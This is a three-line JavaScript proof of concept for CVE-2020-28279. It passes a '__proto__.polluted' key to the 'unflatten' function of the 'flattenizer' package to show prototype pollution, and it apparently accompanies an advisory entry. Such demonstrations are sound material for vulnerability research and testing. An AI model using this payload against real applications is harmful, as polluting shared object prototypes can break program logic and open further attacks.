//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28279
const flattenizer = require("flattenizer");
flattenizer.unflatten({ "__proto__.polluted": "yes" });
